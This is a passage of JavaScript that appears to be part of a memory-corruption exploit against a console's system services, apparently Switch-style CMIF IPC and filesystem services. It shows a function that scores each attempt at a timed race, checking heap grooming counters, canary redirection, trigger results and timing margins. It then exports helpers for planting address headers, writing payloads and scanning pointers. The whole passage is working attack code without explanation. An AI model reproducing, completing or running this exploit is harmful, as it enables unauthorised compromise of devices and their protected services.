      var scv = Number(read32(gates.sampledCompleted)) >>> 0;
      var sev = Number(read32(gates.sampledEarlyHole)) >>> 0;
      var ssv = Number(read32(gates.spacingDecision)) >>> 0;
      var triggerAborted = scv !== 0 || sev !== 0 || ssv !== 0;

      var protectedRoleIds = [0, 2, 3, 4, 5, 6, 7, 8, 10, 11];
      var protectedDone = protectedRoleIds.filter(function(role) {
          return Number(read8(gates.roleDoneFlags + BigInt(role))) !== 0;
      }).length;

      var pinSent = roleSendCode(waveData.frames, 9, pinSendIndex) === 0;
      var pinReply = pinSent ? cmifReply(pinPkt) :
          { result: 0xFFFFFFFF, moves: [], copies: [] };
      var pinShapeOk = pinReply.result === 0 && (!createPinThisWave ||
          (pinReply.copies.length === 0 && pinReply.moves.length === 1));
      if (createPinThisWave && pinShapeOk) pinHandle = pinReply.moves[0];
      if (createPinThisWave && !pinShapeOk) {
          for (var ph = 0; ph < pinReply.moves.length; ph++) closeHandle(pinReply.moves[ph]);
          for (var ph = 0; ph < pinReply.copies.length; ph++) closeHandle(pinReply.copies[ph]);
      }
      var clearReply = roleSendCode(waveData.frames, 9, clearSendIndex) === 0
          ? cmifReply(clearPkt) : { result: 0xFFFFFFFF };
      var preReply = roleSendCode(waveData.frames, 9, preSendIndex) === 0
          ? cmifReply(prePkt) : { result: 0xFFFFFFFF };
      var preStats = preReply.result === 0 ? [] : null;
      if (preStats) {
          for (var pi = 0; pi < 16; pi++)
              preStats.push(Number(read64(prePkt + BigInt(preReply.data + pi * 8))));
      }

      var afterStats = readAllocationCounters(rootSession, pktBuf);
      var preReleaseUsed = group.held && preStats
          ? group.held[5] - preStats[5] : null;
      var pinPersistentBytes = createPinThisWave && afterStats && group.before
          ? group.before[5] - afterStats[5] : null;
      var pinCostOk = !createPinThisWave ||
          pinPersistentBytes === config.PINNING_ALLOCATION_BYTES;
      var restored = Boolean(afterStats && group.before &&
          Math.abs(afterStats[5] +
              (createPinThisWave ? config.PINNING_ALLOCATION_BYTES : 0) -
              group.before[5]) <= config.HEAP_JITTER_BYTES);

      var sendCodes = [];
      for (var ci = 0; ci < 13; ci++)
          sendCodes.push(roleSendCode(waveData.frames, ci, sendIndices[ci]));
      var transportOk = sendCodes.filter(function(c) { return c === 0; }).length;
      var resultAt = function(index) {
          return sendCodes[index] === 0
              ? (Number(cmifReply(REQ[index]).result) >>> 0) : 0xFFFFFFFF;
      };
      var typeAt = function(index, result) {
          if (result !== 0 || sendCodes[index] !== 0) return -1;
          var reply = cmifReply(REQ[index]);
          return Number(read32(REQ[index] + BigInt(reply.data))) >>> 0;
      };

      var commitResult = resultAt(0);
      var readResult = resultAt(1);
      var tailResults = [2, 3, 4, 5].map(resultAt);
      var canaryResult = resultAt(6);
      var canaryType = typeAt(6, canaryResult);
      var triggerResult = resultAt(12);
      var triggerType = typeAt(12, triggerResult);
      var fillerResults = [7, 8].map(resultAt);
      var guardResults = [10, 11].map(resultAt);
      var health = queryCanaryHealth({canaryPath, savedHandle, setupPath, setupPkt});

      var canaryStart = readFrameResult(waveData.frames[6].frame, sendIndices[6] - 1);
      var canaryEnd = readFrameResult(waveData.frames[6].frame, sendIndices[6] + 1);
      var pinStart = readFrameResult(waveData.frames[9].frame, pinSendIndex - 1);
      var pinEnd = readFrameResult(waveData.frames[9].frame, pinSendIndex + 1);
      var pinWindowMeasured = createPinThisWave &&
          canaryStart !== FRAME_SENTINEL && canaryEnd !== FRAME_SENTINEL &&
          pinStart !== FRAME_SENTINEL && pinEnd !== FRAME_SENTINEL;
      var pinWindowOk = pinWindowMeasured &&
          canaryStart < pinStart && pinEnd < canaryEnd;
      var pinStartOffsetUs = pinWindowMeasured
          ? ticksToUs(pinStart - canaryStart) : null;
      var pinEndMarginUs = pinWindowMeasured
          ? ticksToUs(canaryEnd - pinEnd) : null;

      if (createPinThisWave)
          pinFirstWaveQualified = pinShapeOk && pinWindowOk && pinCostOk && restored;

      var changedPaths = [];
      if (canaryResult !== 0 || canaryType !== 1) changedPaths.push("canary");
      for (var fi = 0; fi < fillerResults.length; fi++)
          if (fillerResults[fi] !== 0x202) changedPaths.push("filler" + fi);
      for (var gi = 0; gi < guardResults.length; gi++)
          if (guardResults[gi] !== 0x202) changedPaths.push("guard" + gi);

      var selectedMarker = triggerResult === 0 && triggerType === 1;
      var observedCanaryRedirect = canaryResult === 0 && canaryType === 0 &&
          changedPaths.length === 1 && changedPaths[0] === "canary";
      var canaryRedirect = observedCanaryRedirect;
      var tailsExpected = tailResults.every(function(r) {
          return r !== 0xFFFFFFFF && (r & 0x3FFFFF) === 0x00320002;
      });
      var reservationExpected = group.reserved === 59 &&
          group.failures.length === 0 && group.outer !== 0;
      var releaseWasSent = sendCodes[9] === 0;
      var isPositiveProfile = profile === "positive" || profile.indexOf("cache") === 0;
      var pathsExpected = fillerResults.every(function(r) {
          return r === 0x202 || (isPositiveProfile && r === 0x2EEA02);
      }) && guardResults.every(function(r) { return r === 0x202; });

      var window = Boolean(reservationExpected && wave.done === 13 &&
          transportOk === 13 && wave.joined === 13 &&
          protectedDone === 10 && releaseWasSent &&
          Number(wave.signalResult) === 0 && trigSpan &&
          overlap.shapeCount === 10 &&
          overlap.receiveMarginUs !== null && overlap.receiveMarginUs >= 300 &&
          !triggerAborted && tailsExpected && commitResult === 0 &&
          readResult === 0 && pathsExpected &&
          pinShapeOk && clearReply.result === 0 &&
          preReply.result === 0 && restored && pinCostOk &&
          (!createPinThisWave || pinWindowOk) && pinFirstWaveQualified &&
          preReleaseUsed !== null && preReleaseUsed >= config.WINDOW_MINIMUM_CACHE_HELD);

      var postCanaryHealthy = health.transport === 0 &&
          health.result === 0 && health.type === 1;
      var triggerCanonical = triggerResult & 0x3FFFFF;

      var wc = checkWindow({
          reservation: reservationExpected,
          "workers-done": wave.done === 13,
          transport: transportOk === 13,
          "workers-join": wave.joined === 13,
          "protected-10": protectedDone === 10,
          "release-sent": releaseWasSent,
          signal: Number(wave.signalResult) === 0,
          "trig-span": Boolean(trigSpan),
          "shape-10": overlap.shapeCount === 10,
          "margin>=300": overlap.receiveMarginUs !== null &&
              overlap.receiveMarginUs >= 300,
          "no-abort": !triggerAborted,
          tails: tailsExpected,
          commit: commitResult === 0,
          read: readResult === 0,
          paths: pathsExpected,
          "pin-shape": pinShapeOk,
          "clear-ok": clearReply.result === 0,
          "pre-ok": preReply.result === 0,
          "heap-restore": restored,
          "pin-cost": pinCostOk,
          "pin-window": !createPinThisWave || pinWindowOk,
          "pin-1st": pinFirstWaveQualified,
          "pre-release": preReleaseUsed !== null &&
              preReleaseUsed >= config.WINDOW_MINIMUM_CACHE_HELD
      });
      var roleTimings = extractRoleTimings(spans, trigSpan);
      return {
          shape: overlap.shapeCount,
          shapeMissing: overlap.shapeMissing.slice(),
          margin: overlap.receiveMarginUs !== null
              ? overlap.receiveMarginUs.toFixed(0) : null,
          marginUsRaw: overlap.receiveMarginUs,
          marginSlackUs: overlap.receiveMarginUs !== null
              ? overlap.receiveMarginUs - 300 : null,
          preReleaseSlackBytes: preReleaseUsed !== null
              ? preReleaseUsed - config.WINDOW_MINIMUM_CACHE_HELD : null,
          window: wc.ok,
          rejections: wc.rejections,
          sendCodes: sendCodes,
          readResult: readResult,
          roleTimings: roleTimings,
          canaryType: canaryType,
          canaryResult: canaryResult,
          triggerType: triggerType,
          selectedMarker: selectedMarker,
          observedCanaryRedirect: observedCanaryRedirect,
          postCanaryHealth: {
              transport: health.transport,
              result: health.result,
              type: health.type,
              healthy: postCanaryHealthy
          },
          guardSamples: {
              completed: scv,
              earlyHole: sev,
              spacing: ssv
          },
          pinDiagnostics: {
              created: createPinThisWave,
              result: pinReply.result,
              moves: pinReply.moves.length,
              copies: pinReply.copies.length,
              persistentBytes: pinPersistentBytes,
              expectedBytes: config.PINNING_ALLOCATION_BYTES,
              shapeOk: pinShapeOk,
              costOk: pinCostOk,
              windowMeasured: pinWindowMeasured,
              windowOk: pinWindowOk,
              startOffsetUs: pinStartOffsetUs,
              endMarginUs: pinEndMarginUs,
              restored: restored
          },
          canaryRedirect: profile === "positive" && wc.ok && canaryRedirect && postCanaryHealthy,
          extentQualified: profile === "extent-present" && wc.ok && selectedMarker &&
              canaryResult === 0 && canaryType === 1 && postCanaryHealthy,
          negativeControl: profile === "negative" && window && !triggerAborted &&
              triggerCanonical === 0x2EEC02 && canaryResult === 0 &&
              canaryType === 1 && postCanaryHealthy,
          abortControl: triggerAborted && scv === 1 &&
              triggerCanonical === abortControlCanonical &&
              canaryResult === 0 && canaryType === 1 && postCanaryHealthy,
          abortHoleControl: triggerAborted && sev === 1 && ssv === 1 &&
              triggerCanonical === abortControlCanonical &&
              canaryResult === 0 && canaryType === 1 && postCanaryHealthy,
          changedPaths: changedPaths,
          preReleaseUsed: preReleaseUsed,
          triggerAborted: triggerAborted,
          triggerResult: triggerResult,
          triggerCanonical: triggerCanonical,
          pinHandle: pinHandle,
          pinFirstWaveQualified: pinFirstWaveQualified
      };
  }

  return {
    inspectFspIdentityTargetsReadOnly: inspectFspIdentityTargetsReadOnly,
    scanNativeLinkBuffer: scanNativeLinkBuffer,
    resolvePoolCandidates: resolvePoolCandidates,
    discoverMetadataAnchors: discoverMetadataAnchors,
    qualifyMetadataPage: qualifyMetadataPage,
    verifyAddressCandidate: verifyAddressCandidate,
    scanRootDomainChunk: scanRootDomainChunk,
    captureDomainTail: captureDomainTail,
    recordRootDomainCandidate: recordRootDomainCandidate,
    readFsAddressBytes: readFsAddressBytes,
    inspectRootBackend: inspectRootBackend,
    pad2: pad2,
    padRight: padRight,
    formatWaveSummaryLine: formatWaveSummaryLine,
    readHexBytes: readHexBytes,
    bytesToHex: bytesToHex,
    ipcGetEntryTypeRawBytes: ipcGetEntryTypeRawBytes,
    checkAddressHeaderEncoding: checkAddressHeaderEncoding,
    buffersEqual: buffersEqual,
    hasByteDifferent: hasByteDifferent,
    hasByteDifferentFast: hasByteDifferentFast,
    scanPointerWords: scanPointerWords,
    cleanup: cleanup,
    installAddressHeader: installAddressHeader,
    qualifyCacheBucketPeriod: qualifyCacheBucketPeriod,
    retireCandidateCache: retireCandidateCache,
    buildPlans: buildPlans,
    configureProfile: configureProfile,
    configurePayload: configurePayload,
    writeIntoPayload: writeIntoPayload,
    checkPathPairQuiet: checkPathPairQuiet,
    queryCanaryHealth: queryCanaryHealth,
    nulWrites: nulWrites,
    analyzeWave: analyzeWave
  };
}
